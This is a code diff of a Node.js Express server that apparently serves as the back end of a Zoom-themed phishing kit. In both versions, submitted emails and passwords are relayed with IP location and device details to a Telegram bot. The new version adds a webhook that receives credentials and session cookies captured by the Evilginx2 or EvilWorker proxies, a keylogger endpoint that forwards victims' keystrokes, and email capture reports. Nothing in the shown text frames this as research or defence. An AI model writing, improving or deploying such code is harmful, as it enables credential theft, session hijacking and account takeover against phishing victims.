@@ -2,237 +2,219 @@ require('dotenv').config();
 
 const express = require('express');
 const cors = require('cors');
-const bodyParser = require('body-parser');
 const https = require('https');
-const fetch = require('node-fetch');
+const axios = require('axios');
+const nodemailer = require('nodemailer');
 
 const app = express();
 
 // --- CONFIGURATION ---
-const PORT = process.env.PORT || 8080;
-const SECRET = process.env.SECRET || "zoom_meeting_secret_2026";
+const PORT = process.env.PORT || 3000;
+const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'evilginx_webhook_secret_2026';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const EMAIL_PASSWORD = process.env.EMAIL_PASSWORD || "de23#$QZoom2026!";
+const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
+const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD;
 
-// Validate Environment Variables
-console.log("--- Environment Variable Check ---");
-console.log("TELEGRAM_BOT_TOKEN:", TELEGRAM_BOT_TOKEN ? "DEFINED (OK)" : "MISSING (Set in Render Env)");
-console.log("TELEGRAM_CHAT_ID:", TELEGRAM_CHAT_ID ? "DEFINED (OK)" : "MISSING (Set in Render Env)");
-console.log("----------------------------------");
-
-const allowedOrigins = [
-  'http://localhost:3000',
-  'http://localhost:8080',
-  'https://business-meeting.vercel.app',
-  'https://meeting-h5ze.onrender.com',
-  'https://xxx-meeting.vercel.app',
-  'https://pedidoorder.netlify.app',
-  'https://your-backblaze-or-cuugmstom-domain.com'
-];
+// --- ENVIRONMENT CHECK ---
+console.log('--- Environment Check ---');
+console.log('TELEGRAM_BOT_TOKEN:', TELEGRAM_BOT_TOKEN ? '✅ SET' : '❌ MISSING');
+console.log('TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID ? '✅ SET' : '❌ MISSING');
+console.log('ADMIN_EMAIL:', ADMIN_EMAIL ? '✅ SET' : '⚠️ Optional');
+console.log('GMAIL_APP_PASSWORD:', GMAIL_APP_PASSWORD ? '✅ SET' : '⚠️ Optional');
+console.log('WEBHOOK_SECRET:', WEBHOOK_SECRET ? '✅ SET' : '⚠️ Using default');
+console.log('---------------------------');
 
 // --- MIDDLEWARE ---
-// Allow all origins for easier deployment (you can restrict later if needed)
-app.use(cors({
-  origin: true,
-  credentials: true
-}));
-
-app.use(bodyParser.json({ limit: '10mb' }));
+app.use(cors({ origin: true, credentials: true }));
+app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
-// Global error handlers
-process.on('uncaughtException', (err) => {
-  console.error('🔥 UNCAUGHT EXCEPTION:', err);
-});
+// --- EMAIL TRANSPORTER ---
+let transporter = null;
+if (ADMIN_EMAIL && GMAIL_APP_PASSWORD) {
+    transporter = nodemailer.createTransport({
+        host: 'smtp.gmail.com',
+        port: 587,
+        secure: false,
+        auth: { user: ADMIN_EMAIL, pass: GMAIL_APP_PASSWORD }
+    });
+    console.log('✅ Email transporter configured');
+} else {
+    console.log('⚠️ Email alerts disabled');
+}
 
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('🔥 UNHANDLED REJECTION:', reason);
-});
+// --- GLOBAL ERROR HANDLERS ---
+process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err));
+process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJECTION:', reason));
 
 // --- HELPERS ---
 function getClientIp(req) {
-  return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
-    || req.connection?.remoteAddress
-    || req.socket?.remoteAddress
-    || "unknown";
+    return (req.headers['x-forwarded-for'] || '').split(',').pop()?.trim()
+        || req.connection?.remoteAddress
+        || req.socket?.remoteAddress
+        || 'unknown';
 }
 
 async function getLocationFromIp(ip) {
-  return new Promise((resolve) => {
-    const request = https.get(`https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`, { timeout: 5000 }, (resp) => {
-      let data = '';
-      resp.on('data', chunk => data += chunk);
-      resp.on('end', () => {
-        try {
-          const response = JSON.parse(data);
-          resolve(response.status === 'success' 
-            ? `${response.city}, ${response.regionName}, ${response.country}` 
-            : 'Location unavailable');
-        } catch (e) { resolve('Location error'); }
-      });
+    return new Promise((resolve) => {
+        const request = https.get(
+            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`,
+            { timeout: 5000 },
+            (resp) => {
+                let data = '';
+                resp.on('data', chunk => data += chunk);
+                resp.on('end', () => {
+                    try {
+                        const response = JSON.parse(data);
+                        resolve(response.status === 'success'
+                            ? `${response.city}, ${response.regionName}, ${response.country}`
+                            : 'Location unavailable');
+                    } catch (e) { resolve('Location error'); }
+                });
+            }
+        );
+        request.on('error', () => resolve('Location error'));
+        request.on('timeout', () => {
+            request.destroy();
+            resolve('Location timeout');
+        });
     });
-    
-    request.on('error', () => resolve('Location error'));
-    request.on('timeout', () => {
-      request.destroy();
-      resolve('Location timeout');
-    });
-  });
 }
 
-async function sendTelegramAlert(message) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-    console.warn("⚠️ Telegram not configured (check TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)");
-    console.warn("   TELEGRAM_BOT_TOKEN:", TELEGRAM_BOT_TOKEN ? "SET" : "NOT SET");
-    console.warn("   TELEGRAM_CHAT_ID:", TELEGRAM_CHAT_ID ? "SET" : "NOT SET");
-    return;
-  }
-  try {
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 10000);
-    
-    console.log("📤 Sending Telegram alert:", { chat_id: TELEGRAM_CHAT_ID, text_length: message.length });
-    
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
-      signal: controller.signal
-    });
-    
-    const data = await response.json();
-    console.log("📥 Telegram API response:", data);
-    
-    if (data.ok) {
-      console.log("✅ Telegram alert sent successfully!");
-    } else {
-      console.error("❌ Telegram API error:", data);
+async function sendToTelegram(text, parseMode = 'Markdown') {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: parseMode
+        });
+        console.log('✅ Telegram sent');
+    } catch (error) {
+        console.error('❌ Telegram error:', error.message);
     }
-    
-    clearTimeout(timeoutId);
-  } catch (e) { 
-    console.error('❌ Telegram error:', e); 
-  }
 }
 
-// --- ENDPOINTS ---
+async function sendEmail(subject, htmlBody) {
+    if (!transporter) return;
+    try {
+        await transporter.sendMail({
+            from: `"Security Alert" <${ADMIN_EMAIL}>`,
+            to: ADMIN_EMAIL,
+            subject: subject,
+            html: htmlBody
+        });
+        console.log('📧 Email sent');
+    } catch (error) {
+        console.error('❌ Email error:', error.message);
+    }
+}
 
+function formatVisitorInfo(visitorInfo) {
+    if (!visitorInfo) return '';
+    const fields = [];
+    if (visitorInfo.fullUrl) fields.push(`Full URL: ${visitorInfo.fullUrl}`);
+    if (visitorInfo.referrer) fields.push(`Referrer: ${visitorInfo.referrer}`);
+    if (visitorInfo.userAgent) fields.push(`User Agent: ${visitorInfo.userAgent}`);
+    if (visitorInfo.platform) fields.push(`Platform: ${visitorInfo.platform}`);
+    if (visitorInfo.deviceType) fields.push(`Device Type: ${visitorInfo.deviceType}`);
+    if (visitorInfo.language) fields.push(`Language: ${visitorInfo.language}`);
+    if (visitorInfo.timezone) fields.push(`Timezone: ${visitorInfo.timezone}`);
+    if (visitorInfo.screenWidth && visitorInfo.screenHeight) {
+        fields.push(`Screen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`);
+    }
+    if (visitorInfo.sessionId) fields.push(`Session ID: ${visitorInfo.sessionId}`);
+    return fields.length ? `\n\n--- Visitor Details ---\n${fields.join('\n')}` : '';
+}
+
+// --- WEBHOOK (EvilWorker / Evilginx2) ---
+app.post('/webhook', async (req, res) => {
+    const secret = req.headers['x-webhook-secret'];
+    if (secret !== WEBHOOK_SECRET) return res.status(403).send('Forbidden');
+
+    const data = req.body;
+    const ip = getClientIp(req);
+    const location = await getLocationFromIp(ip);
+
+    let tgMsg = `🔐 *Capture Report*\n\n`;
+    tgMsg += `*Event:* ${data.event || 'Unknown'}\n`;
+    tgMsg += `*Location:* ${location}\n`;
+    tgMsg += `*IP Address:* ${ip}\n`;
+    if (data.username) tgMsg += `*Username:* ${data.username}\n`;
+    if (data.password) tgMsg += `*Password:* ${data.password}\n`;
+    if (data.user_agent) tgMsg += `*User Agent:* ${data.user_agent}\n`;
+    if (data.tokens) {
+        tgMsg += `*🍪 Session Cookies (HttpOnly):*\n`;
+        for (const [name, value] of Object.entries(data.tokens)) {
+            tgMsg += `  \`${name}\`: \`${value}\`\n`;
+        }
+    }
+
+    let emailHtml = `<h2>🔐 Capture Report</h2><ul>`;
+    emailHtml += `<li><strong>Event:</strong> ${data.event}</li>`;
+    emailHtml += `<li><strong>Location:</strong> ${location}</li>`;
+    emailHtml += `<li><strong>IP:</strong> ${ip}</li>`;
+    if (data.username) emailHtml += `<li><strong>Username:</strong> ${data.username}</li>`;
+    if (data.password) emailHtml += `<li><strong>Password:</strong> ${data.password}</li>`;
+    if (data.user_agent) emailHtml += `<li><strong>User Agent:</strong> ${data.user_agent}</li>`;
+    if (data.tokens) {
+        emailHtml += `<li><strong>Session Cookies:</strong><pre>${JSON.stringify(data.tokens, null, 2)}</pre></li>`;
+    }
+    emailHtml += `</ul>`;
+
+    await sendToTelegram(tgMsg);
+    await sendEmail('🔐 Capture Report', emailHtml);
+    res.sendStatus(200);
+});
+
+// --- KEYLOGGER ---
+app.post('/api/keylog', async (req, res) => {
+    try {
+        const { keystrokes, url, userAgent, timestamp, ip: clientIp } = req.body;
+        if (!keystrokes) return res.sendStatus(400);
+
+        const ip = clientIp || getClientIp(req);
+        const location = await getLocationFromIp(ip);
+        const truncated = keystrokes.length > 1000 ? keystrokes.slice(0, 1000) + '...' : keystrokes;
+
+        const tgMsg = `⌨️ *Keylogger Report*\n\n`;
+        tgMsg += `*IP:* ${ip}\n`;
+        tgMsg += `*Location:* ${location}\n`;
+        tgMsg += `*URL:* ${url || 'Unknown'}\n`;
+        tgMsg += `*User Agent:* ${userAgent || 'Unknown'}\n`;
+        tgMsg += `*Timestamp:* ${timestamp || new Date().toISOString()}\n\n`;
+        tgMsg += `*Keystrokes:*\n\`\`\`\n${truncated}\n\`\`\``;
+
+        await sendToTelegram(tgMsg);
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('Keylog error:', error.message);
+        res.status(500).send('Error');
+    }
+});
+
+// --- LOG ACTION (Frontend) ---
 app.post('/api/log-action', async (req, res) => {
-  try {
-    const { action, email, password, intruderDetected, attempts, visitorInfo } = req.body;
-    const ip = getClientIp(req);
-    const location = await getLocationFromIp(ip);
-    const ua = req.headers['user-agent'];
+    try {
+        const { action, email, password, visitorInfo } = req.body;
+        const ip = getClientIp(req);
+        const location = await getLocationFromIp(ip);
 
-    console.log(`[ACTION] ${action} | IP: ${ip} | Email: ${email || 'none'}`);
+        let tgMsg = `🚨 *Zoom Action: ${action?.toUpperCase() || 'UNKNOWN'}*\n`;
+        tgMsg += `*Email:* ${email || 'none'}\n`;
+        tgMsg += `*Password:* ${password || 'N/A'}\n`;
+        tgMsg += `*Location:* ${location}\n`;
+        tgMsg += `*IP:* ${ip}\n`;
+        tgMsg += `*Time:* ${new Date().toISOString()}`;
+        tgMsg += formatVisitorInfo(visitorInfo);
 
-    let tgText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
-Login ID: ${email || 'none'}
-Password: ${password || 'N/A'}
-Location: ${location}
-IP Address: ${ip}
-Time: ${new Date().toISOString()}`;
-    
-    // Add visitor info details
-    if (visitorInfo) {
-      tgText += `\n\n--- Visitor Details ---`;
-      if (visitorInfo.fullUrl) tgText += `\nFull URL: ${visitorInfo.fullUrl}`;
-      if (visitorInfo.referrer) tgText += `\nReferrer: ${visitorInfo.referrer}`;
-      if (visitorInfo.userAgent) tgText += `\nUser Agent: ${visitorInfo.userAgent}`;
-      if (visitorInfo.platform) tgText += `\nPlatform: ${visitorInfo.platform}`;
-      if (visitorInfo.deviceType) tgText += `\nDevice Type: ${visitorInfo.deviceType}`;
-      if (visitorInfo.language) tgText += `\nLanguage: ${visitorInfo.language}`;
-      if (visitorInfo.timezone) tgText += `\nTimezone: ${visitorInfo.timezone}`;
-      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
-      if (visitorInfo.colorDepth) tgText += `\nColor Depth: ${visitorInfo.colorDepth}-bit`;
-      if (visitorInfo.cookiesEnabled !== undefined) tgText += `\nCookies Enabled: ${visitorInfo.cookiesEnabled ? 'Yes' : 'No'}`;
-      if (visitorInfo.sessionId) tgText += `\nSession ID: ${visitorInfo.sessionId}`;
-      if (visitorInfo.timeOnSiteSeconds) tgText += `\nTime on Site: ${visitorInfo.timeOnSiteSeconds} seconds`;
-      if (visitorInfo.pagesVisited) tgText += `\nPages Visited: ${visitorInfo.pagesVisited.join(', ')}`;
+        await sendToTelegram(tgMsg);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Log error:', error.message);
+        res.status(500).json({ success: false });
     }
-    
-    if (intruderDetected) tgText += `\n\n🚨 INTRUDER DETECTED!`;
-    
-    sendTelegramAlert(tgText);
-
-    res.json({ success: true });
-  } catch (error) {
-    console.error('API Error (/log-action):', error.message);
-    res.status(500).json({ success: false });
-  }
 });
 
-app.post('/api/authenticate', async (req, res) => {
-  try {
-    const { email, password, visitorInfo } = req.body;
-    const ip = getClientIp(req);
-    const location = await getLocationFromIp(ip);
-    const ua = req.headers['user-agent'];
-
-    console.log(`[LOGIN] Attempt for: ${email} | IP: ${ip}`);
-
-    let tgText = `🔐 New Zoom Login Attempt
-Login ID: ${email}
-Password: ${password}
-Location: ${location}
-IP Address: ${ip}
-Time: ${new Date().toISOString()}`;
-    
-    // Add visitor info details
-    if (visitorInfo) {
-      tgText += `\n\n--- Visitor Details ---`;
-      if (visitorInfo.fullUrl) tgText += `\nFull URL: ${visitorInfo.fullUrl}`;
-      if (visitorInfo.referrer) tgText += `\nReferrer: ${visitorInfo.referrer}`;
-      if (visitorInfo.userAgent) tgText += `\nUser Agent: ${visitorInfo.userAgent}`;
-      if (visitorInfo.platform) tgText += `\nPlatform: ${visitorInfo.platform}`;
-      if (visitorInfo.deviceType) tgText += `\nDevice Type: ${visitorInfo.deviceType}`;
-      if (visitorInfo.language) tgText += `\nLanguage: ${visitorInfo.language}`;
-      if (visitorInfo.timezone) tgText += `\nTimezone: ${visitorInfo.timezone}`;
-      if (visitorInfo.screenWidth && visitorInfo.screenHeight) tgText += `\nScreen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`;
-      if (visitorInfo.colorDepth) tgText += `\nColor Depth: ${visitorInfo.colorDepth}-bit`;
-      if (visitorInfo.cookiesEnabled !== undefined) tgText += `\nCookies Enabled: ${visitorInfo.cookiesEnabled ? 'Yes' : 'No'}`;
-      if (visitorInfo.sessionId) tgText += `\nSession ID: ${visitorInfo.sessionId}`;
-      if (visitorInfo.timeOnSiteSeconds) tgText += `\nTime on Site: ${visitorInfo.timeOnSiteSeconds} seconds`;
-      if (visitorInfo.pagesVisited) tgText += `\nPages Visited: ${visitorInfo.pagesVisited.join(', ')}`;
-    }
-    
-    sendTelegramAlert(tgText);
-
-    if (password === EMAIL_PASSWORD) {
-      const redirect = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
-      return res.json({ success: true, redirect });
-    } else {
-      return res.status(401).json({ success: false, error: 'Invalid password.' });
-    }
-  } catch (error) {
-    console.error('API Error (/authenticate):', error.message);
-    res.status(500).json({ success: false });
-  }
-});
-
-app.get('/health', (req, res) => res.json({ status: 'OK', time: new Date() }));
-
-// 🚀 TEST TELEGRAM ENDPOINT
-app.get('/api/test-telegram', async (req, res) => {
-  try {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      return res.status(400).json({ 
-        success: false, 
-        error: "Telegram variables are not set (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)" 
-      });
-    }
-    
-    console.log("[TEST] Sending test Telegram message...");
-    await sendTelegramAlert("🧪 Zoom Backend Test Message: Telegram is working correctly! ✅");
-    
-    res.json({ success: true, message: "Telegram test message sent!" });
-  } catch (error) {
-    console.error("❌ Telegram Test Failed:", error);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
-app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
